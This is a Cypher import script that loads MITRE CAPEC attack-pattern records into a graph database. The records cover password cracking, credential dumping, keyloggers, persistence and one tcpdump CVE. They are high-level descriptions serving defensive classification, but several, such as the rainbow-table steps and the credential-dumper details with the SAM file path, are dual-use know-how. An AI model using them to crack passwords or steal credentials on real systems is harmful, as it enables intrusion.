CREATE (:CVE{id: "CVE-2004-0183", description: "<div level=\"0\">\n  <p class=\"text\">TCPDUMP 3.8.1 and earlier allows remote attackers to cause a denial of service (crash) via ISAKMP packets containing a Delete payload with a large number of SPI's, which causes an out-of-bounds read, as demonstrated by the Striker ISAKMP Protocol Test Suite.</p>\n</div>"});
MERGE (:CWE{id: 125});
CREATE (:AttackPattern{id: 541, name: "Application Fingerprinting", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 415, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 480});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 474, summary: "OrderedDict([('Text', 'An adversary engages in fingerprinting activities to determine the type or version of an application installed on a remote target.')])"});
CREATE (:AttackPattern{id: 542, name: "Targeted Malware", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 481});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 319});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 475, summary: "OrderedDict([('Text', 'An adversary develops targeted malware that takes advantage of a known vulnerability in an organizational information technology environment. The malware crafted for these attacks is based specifically on information gathered about the technology environment. Successfully executing the malware enables an adversary to achieve a wide variety of negative technical impacts.')])"});
CREATE (:AttackPattern{id: 543, name: "Counterfeit Websites", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 416, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 482});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 320});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 476, summary: "OrderedDict([('Text', 'Adversary creates duplicates of legitimate websites. When users visit a counterfeit site, the site can gather information or upload malware.')])"});
CREATE (:AttackPattern{id: 544, name: "Counterfeit Organizations", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 417, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:Submission{id: 483});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 477, summary: "OrderedDict([('Text', 'An adversary creates a false front organizations with the appearance of a legitimate supplier in the critical life cycle path that then injects corrupted/malicious information system components into the organizational supply chain.')])"});
CREATE (:AttackPattern{id: 545, name: "Pull Data from System Resources", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 484});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 321});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, References"});
CREATE (:Modification{id: 322});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:PreviousEntryName{id: 92, name: "Probe Application Queries"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 478, summary: "OrderedDict([('Text', 'An adversary who is authorized or has the ability to search known system resources, does so with the intention of gathering useful information. System resources include files, memory, and other aspects of the target system. In this pattern of attack, the adversary does not necessarily know what they are going to find when they start pulling data. This is different than CAPEC-150 where the adversary knows what they are looking for due to the common location.')])"});
MERGE (:Reference{local_id: "R.545.1", author: "ATT&CK Project", title: "Credentials in files (1081)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Credentials_in_files"});
CREATE (:AttackPattern{id: 546, name: "Probe Application Memory", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 485});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 323});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 479, summary: "OrderedDict([('Text', 'An adversary obtains unauthorized information due to insecure or incomplete data deletion in a multi-tenant environment. (e.g., in a cloud computing environment)')])"});
CREATE (:AttackPattern{id: 547, name: "Physical Destruction of Device or Component", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 486});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 324});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 480, summary: "OrderedDict([('Text', 'An adversary conducts a physical attack a device or component, destroying it such that it no longer functions as intended.')])"});
CREATE (:AttackPattern{id: 548, name: "Contaminate Resource", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 487});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 481, summary: "OrderedDict([('Text', 'An adversary contaminates organizational information systems (including devices and networks) by causing them to handle information of a classification/sensitivity for which they have not been authorized. The information is exposed to individuals who are not authorized access to such information, and the information system, device, or network is unavailable while the spill is investigated and mitigated.')])"});
CREATE (:AttackPattern{id: 549, name: "Local Execution of Code", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 418, text: "<div level=\"0\">\n  <p class=\"text\">Knowledge of the target system's vulnerabilities that can be capitalized on with malicious code.</p>\n  <p class=\"text\">The adversary must be able to place the malicious code on the target system.</p>\n</div>"});
CREATE (:Submission{id: 488});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 325});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 482, summary: "OrderedDict([('Text', 'An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.')])"});
CREATE (:ResourcesRequired{id: 235, text: "<div level=\"0\">\n  <p class=\"text\">The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)</p>\n</div>"});
CREATE (:AttackPattern{id: 55, name: "Rainbow Table Password Cracking", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 419, text: "<div level=\"0\">\n  <p class=\"text\">Hash of the original password is available to the attacker. For a better chance of success, an attacker should have more than one hash of the original password, and ideally the whole table.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 420, text: "<div level=\"0\">\n  <p class=\"text\">Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed, which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 421, text: "<div level=\"0\">\n  <p class=\"text\">The system uses one factor password based authentication.</p>\n</div>"});
CREATE (:Submission{id: 489});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 483, summary: "OrderedDict([('Text', ['An attacker gets access to the database table where hashes of passwords are stored. He then uses a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.', 'A password rainbow table stores hash chains for various passwords. A password chain is computed, starting from the original password, P, via a reduce(compression) function R and a hash function H. A recurrence relation exists where Xi+1 = R(H(Xi)), X0 = P. Then the hash chain of length n for the original password P can be formed: X1, X2, X3, ... , Xn-2, Xn-1, Xn, H(Xn). P and H(Xn) are then stored together in the rainbow table.', 'Constructing the rainbow tables takes a very long time and is computationally expensive. A separate table needs to be constructed for the various hash algorithms (e.g. SHA1, MD5, etc.). However, once a rainbow table is computed, it can be very effective in cracking the passwords that have been hashed without the use of salt.'])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Determine application's/system's password policy", description: "<div level=\"0\">\n  <p class=\"text\">Determine the password policies of the target application/system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Determine minimum and maximum allowed password lengths.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Passwords are used in the application/system</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Passwords are not used in the application/system</p>\n</div>"});
CREATE (:AttackStep{id: 2, title: "Obtain password hashes", description: "<div level=\"0\">\n  <p class=\"text\">An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Obtain password hashes from platform-specific storage locations (e.g. Windows registry)</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Sniff network packets containing password hashes.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Password authentication not used in application/system.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one (unsalted) password hash obtained."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No password hashes obtained by attacker."});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Run rainbow table-based password cracking tool", description: "<div level=\"0\">\n  <p class=\"text\">An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in step 2.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in step 2.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "A password corresponding to the hash recovered."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Password corresponding to the hash could not be recovered with the given rainbow table."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:CWE{id: 261});
MERGE (:CWE{id: 521});
MERGE (:CWE{id: 262});
MERGE (:CWE{id: 263});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 719});
CREATE (:ResourcesRequired{id: 236, text: "<div level=\"0\">\n  <p class=\"text\">Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.</p>\n</div>"});
CREATE (:AttackPattern{id: 550, name: "Install New Service", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 490});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 326});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 484, summary: "OrderedDict([('Text', 'When an operating system starts, it also starts programs called services or daemons. Adversaries may install a new service which will be executed at startup (on a Windows system, by modifying the registry). The service name may be disguised by using a name from a related operating system or benign software. Services are usually run with elevated privileges.')])"});
MERGE (:Reference{local_id: "R.550.1", author: "ATT&CK Project", title: "New Service (T1050)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Technique/T1050"});
CREATE (:AttackPattern{id: 551, name: "Modify Existing Service", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 491});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 485, summary: "OrderedDict([('Text', 'When an operating system starts, it also starts programs called services or daemons. Modifying existing services may break existing services or may enable services that are disabled/not commonly used.')])"});
MERGE (:Reference{local_id: "R.551.1", author: "ATT&CK Project", title: "Modify Existing Service (1031)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Modify_existing_service"});
CREATE (:AttackPattern{id: 552, name: "Install Rootkit ", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 492});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 486, summary: "OrderedDict([('Text', 'A hypervisor is a software layer that sits between the operating system and the processor. It presents a virtual running environment to the operating system. An example of a common hypervisor is Xen. Because a hypervisor operates at a level below the operating system it can hide its existence from the operating system.')])"});
MERGE (:Reference{local_id: "R.552.1", author: "ATT&CK Project", title: "Hypervisor Rootkit (1062)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Hypervisor_rootkit"});
CREATE (:AttackPattern{id: 554, name: "Functionality Bypass", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 493});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 487, summary: "OrderedDict([('Text', 'An adversary attacks a system by bypassing some or all functionality intended to protect it. Often, a system user will think that protection is in place, but the functionality behind those protections has been disabled by the adversary.')])"});
CREATE (:AttackPattern{id: 555, name: "Remote Services with Stolen Credentials", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 494});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 488, summary: "OrderedDict([('Text', 'An adversary leverages remote services such as RDP, telnet, SSH, and VNC to log into a system with stolen credentials.')])"});
MERGE (:Reference{local_id: "R.560.1", author: "ATT&CK Project", title: "Remote Desktop Protocol (1076)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Remote_Desktop_Protocol"});
MERGE (:Reference{local_id: "R.560.1", author: "ATT&CK Project", title: "Remote Services (1021)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Remote_services"});
CREATE (:AttackPattern{id: 556, name: "Replace File Extension Handlers", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 495});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 489, summary: "OrderedDict([('Text', 'When a file is opened, its file handler is checked to determine which program opens the file. File handlers are configuration properties of many operating systems. Applications can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened.')])"});
MERGE (:Reference{local_id: "R.556.1", author: "ATT&CK Project", title: "Edit Default File Handlers (1042)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Edit_default_file_handlers"});
CREATE (:AttackPattern{id: 557, name: "Schedule Software To Run", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 496});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 490, summary: "OrderedDict([('Text', 'It is possible to schedule software to be run at a time in the future (Windows commands \"at\" and \"schtasks\", along with the Windows Task Scheduler, cron in UNIX-based systems). Task scheduling may be used to execute programs on a scheduled basis to for various malicious purposes.')])"});
MERGE (:Reference{local_id: "R.557.1", author: "ATT&CK Project", title: "Scheduled Task (1053)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Scheduled_task"});
CREATE (:AttackPattern{id: 558, name: "Replace Trusted Executable", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 497});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 491, summary: "OrderedDict([('Text', 'An attacker replaces replaces a trusted executable to allow for the execution of malware when that trusted executable is called.')])"});
CREATE (:AttackPattern{id: 559, name: "Orbital Jamming", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 422, text: "<div level=\"0\">\n  <p class=\"text\">This attack requires the knowledge of the satellite's coordinates for targeting.</p>\n</div>"});
CREATE (:Submission{id: 498});
MERGE (:Person{name: "Seamus Tuohy"});
MERGE (:Date{date: "2017-01-12"});
CREATE (:Description{id: 492, summary: "OrderedDict([('Text', \"In this attack pattern, the adversary sends disruptive signals at a target satellite using a rogue uplink station to disrupt the intended transmission. Those within the satellite's footprint are prevented from reaching the satellite's targeted or neighboring channels. The satellite's footprint size depends upon its position in the sky; higher orbital satellites cover multiple continents.\")])"});
MERGE (:Reference{id: "REF-2", local_id: "R.17.1", author: "Small Media", title: "Satellite Jamming in Iran: A War over Airwaves", pubdate: "November 2012"});
CREATE (:ResourcesRequired{id: 237, text: "<div level=\"0\">\n  <p class=\"text\">A satellite uplink station.</p>\n</div>"});
CREATE (:AttackPattern{id: 56, name: "DEPRECATED: Removing/short-circuiting 'guard logic'", status: "Deprecated", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:Submission{id: 499});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 327});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Modification{id: 328});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Activation_Zone, Architectural_Paradigms, Attack_Motivation-Consequences, Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, CIA_Impact, Description, Description Summary, Examples-Instances, Frameworks, Injection_Vector, Languages, Payload, Payload_Activation_Impact, Platforms, Probing_Techniques, Purposes, Related_Attack_Patterns, Related_Guidelines, Related_Security_Principles, Related_Vulnerabilities, Related_Weaknesses, Resources_Required, Technical_Context, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:PreviousEntryName{id: 93, name: "Removing/short-circuiting 'guard logic'"});
MERGE (:Date{date: "2017-05-01"});
CREATE (:Description{id: 493, summary: "OrderedDict([('Text', 'This attack pattern has been deprecated as it is a duplicate of CAPEC-207 : Removing Important Client Functionality. Please refer to this other pattern going forward.')])"});
CREATE (:AttackPattern{id: 560, name: "Use of Known Domain Credentials", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 500});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Modification{id: 329});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Description{id: 494, summary: "OrderedDict([('Text', 'An adversary uses stolen credentials (e.g., userid and password) to access systems managed under the same credential framework on a local network. Often, users are allowed to login to connected machines using the same password. Discovery of the password on one machine allows for lateral movement to those machines.')])"});
MERGE (:Reference{local_id: "R.560.1", author: "ATT&CK Project", title: "Legitimate Credentials (1078)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Legitimate_Credentials"});
CREATE (:AttackPattern{id: 561, name: "Windows Admin Shares with Stolen Credentials", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 501});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 495, summary: "OrderedDict([('Text', 'Windows systems have hidden network shares that are only accessible to administrators and allow files to be written to the local computer. Example network shares include: C$, ADMIN$ and IPC$. Adversaries may use valid administrator credentials to remotely access a network share to transfer files and execute code. It is possible for adversaries to use NTLM hashes to access administrator shares on systems with certain configuration and patch levels.')])"});
MERGE (:Reference{local_id: "R.561.1", author: "ATT&CK Project", title: "Windows Admin Shares (1077)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Windows_admin_shares"});
CREATE (:AttackPattern{id: 562, name: "Modify Shared File", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 502});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 496, summary: "OrderedDict([('Text', 'An adversary manipulates the files in a shared location by adding malicious programs, scripts, or exploit code to valid content. Once a user opens the shared content, the tainted content is executed.')])"});
MERGE (:Reference{local_id: "R.562.1", author: "ATT&CK Project", title: "Taint shared content (1080)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Taint_shared_content"});
CREATE (:AttackPattern{id: 563, name: "Add Malicious File to Shared Webroot", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 503});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 497, summary: "OrderedDict([('Text', 'An adversaries may add malicious content to a website through the open file share and then browse to that content with a web browser to cause the server to execute the content. The malicious content will typically run under the context and permissions of the web server process, often resulting in local system or administrative privileges depending on how the web server is configured.')])"});
MERGE (:Reference{local_id: "R.563.1", author: "ATT&CK Project", title: "Shared Webroot (1051)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Shared_webroot"});
CREATE (:AttackPattern{id: 564, name: "Run Software at Logon", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:Submission{id: 504});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 498, summary: "OrderedDict([('Text', 'Operating system allows logon scripts to be run whenever a specific user or users logon to a system. If adversaries can access these scripts, they may insert additional code into the logon script. This code can allow them to maintain persistence or move laterally within an enclave because it is executed every time the affected user or users logon to a computer. Modifying logon scripts can effectively bypass workstation and enclave firewalls. Depending on the access configuration of the logon scripts, either local credentials or a remote administrative account may be necessary.')])"});
MERGE (:Reference{local_id: "R.564.1", author: "ATT&CK Project", title: "Logon scripts (1037)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Logon_scripts"});
CREATE (:AttackPattern{id: 566, name: "Dump Password Hashes", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 423, text: "<div level=\"0\">\n  <p class=\"text\">An adversary has the ability use or install the desired tools.</p>\n</div>"});
CREATE (:Submission{id: 505});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 499, summary: "OrderedDict([('Text', ['An adversary obtains a collection of password hashes through the use of automated utilities designed specifically for gathering this type of information. Examples of credential dumpers include: pwdump7, Windows Credential Editor, Mimikatz, and gsecdump.', 'Current credential dumpers access the LSASS process to obtain credentials through a process open and may inject code into that process. A malicious process may inject into a process that is known to frequently access LSASS beforehand to evade whitelisting. NTLM hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in memory copy of the SAM table before reading hashes.', 'Excavated credential data is often moved from the target system to some other adversary controlled system. Data found on a target system (e.g., hashes) might require extensive resources to be fully analyzed. Using these resources on the target system might enable a defender to detect the adversary. Additionally, proper analysis tools required might not be available on the target system.'])])"});
CREATE (:AttackPattern{id: 567, name: "Obtain Data via Utilities", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 506});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 500, summary: "OrderedDict([('Text', ['In this type of attack, information useful to adversaries in launching follow-on attacks is obtained through the use of helper tools or utilities. The utilities often gather information through well-known and documented system functionality, but can also exploit flaws in the system to retrieve information that is not meant to be obtainable. The information is gathered up and delivered to the adversary so that analysis can be performed.', 'Examples of such utilities include: pwdump7, Windows Credential Editor, Mimikatz, and gsecdump. Many of these utilities are in use by both professional security testers and adversaries.'])])"});
MERGE (:Reference{local_id: "R.566.1", author: "ATT&CK Project", title: "Credential Dumping (1003)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Credential_dumping"});
CREATE (:AttackPattern{id: 568, name: "Capture Credentials via Keylogger", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 424, text: "<div level=\"0\">\n  <p class=\"text\">The ability to install the keylogger, either in person or remote.</p>\n</div>"});
CREATE (:Submission{id: 507});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 501, summary: "OrderedDict([('Text', \"An adversary deploys a keylogger in an effort to obtain credentials directly from a system's user. After capturing all the keystrokes made by a user, the adversary can analyze the data and determine which string are likely to be passwords or other credential related information.\")])"});
CREATE (:AttackPattern{id: 569, name: "Collect Data as Provided by Users", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:Submission{id: 508});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2015-11-09"});
CREATE (:Description{id: 502, summary: "OrderedDict([('Text', 'An attacker leverages a tool, device, or program to obtain specific information as provided by a user of the target system. This information is often needed by the attacker to launch a follow-on attack. This attack is different than Social Engineering as the adversary is not tricking or deceiving the user. Instead the adversary is putting a mechanism in place that captures the information that a user legitimately enters into a system. Deploying a keylogger, performing a UAC prompt, or wrapping the Windows default credential provider are all examples of such interactions.')])"});
MERGE (:Reference{local_id: "R.568.1", author: "ATT&CK Project", title: "User Interaction (1056)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/User_interaction"});
CREATE (:AttackPattern{id: 57, name: "Utilizing REST's Trust in the System Resource to Register Man in the Middle", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 425, text: "<div level=\"0\">\n  <p class=\"text\">Opportunity to intercept must exist beyond the point where SSL is terminated.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 426, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to insert a listener actively (proxying the communication) or passively (sniffing the communication) in the client-server communication path.</p>\n</div>"});
CREATE (:Submission{id: 509});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
